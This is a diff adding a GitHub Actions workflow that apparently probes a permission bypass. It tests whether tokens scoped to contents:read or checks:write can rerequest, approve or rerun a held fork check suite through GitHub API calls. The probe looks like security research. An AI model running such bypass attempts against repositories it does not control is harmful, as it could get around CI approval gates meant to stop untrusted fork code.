@@ -1,0 +1,37 @@
+name: f8-adj-probe
+on:
+  workflow_dispatch:
+    inputs:
+      run_id: {required: true}
+      check_suite_id: {required: true}
+jobs:
+  a_readonly:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: read-only token attempts the bypass
+        env: {GT: "${{ github.token }}", R: "${{ github.repository }}", CS: "${{ inputs.check_suite_id }}"}
+        run: |
+          echo "=== A. READ-ONLY TOKEN (contents:read only) -> rerequest ==="
+          curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $GT" \
+            "https://api.github.com/repos/$R/check-suites/$CS/rerequest"
+  b_checkswrite:
+    needs: a_readonly
+    runs-on: ubuntu-latest
+    permissions:
+      checks: write
+    steps:
+      - name: checks-write token
+        env: {GT: "${{ github.token }}", R: "${{ github.repository }}", RUN: "${{ inputs.run_id }}", CS: "${{ inputs.check_suite_id }}", SHA: "${{ github.sha }}"}
+        run: |
+          H="Authorization: Bearer $GT"
+          echo "=== B. INTENDED PATH approve (needs actions:write) ==="
+          curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "$H" "https://api.github.com/repos/$R/actions/runs/$RUN/approve"
+          echo "=== C. rerun (needs actions:write) ==="
+          curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "$H" "https://api.github.com/repos/$R/actions/runs/$RUN/rerun"
+          echo "=== D. POSITIVE CONTROL: checks:write really granted ==="
+          curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "$H" "https://api.github.com/repos/$R/check-runs" \
+            -d "{\"name\":\"f8-adj-positive-control\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\"}" | tail -4
+          echo "=== E. THE TEST: rerequest the held fork suite ==="
+          curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "$H" "https://api.github.com/repos/$R/check-suites/$CS/rerequest"
